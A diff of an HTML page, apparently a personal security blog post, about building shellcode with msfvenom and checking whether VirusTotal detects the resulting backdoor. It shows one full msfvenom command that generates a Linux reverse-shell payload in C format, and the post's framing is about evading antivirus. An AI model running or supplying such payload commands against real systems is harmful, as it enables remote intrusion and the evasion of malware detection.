@@ -139,8 +139,9 @@ file.c	raw.txt  runme
 To run the Shellcode you have todo the same as before, just copy the output, paste, rename the array, compile and run.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=8089 -b "\x00" -f c -o raw.txt 
 </code></pre></div></div>
-<p>For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected.
-<img src="images/crp.png" alt="Drag Racing" /></p>
+<p>For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected as we see here.</p>
+
+<p><img src="https://github.com/calloczero/calloczero.github.io/blob/main/_images/crop.png?raw=true" alt="VirusTotal Screenshot" /></p>
 
 
 </article>
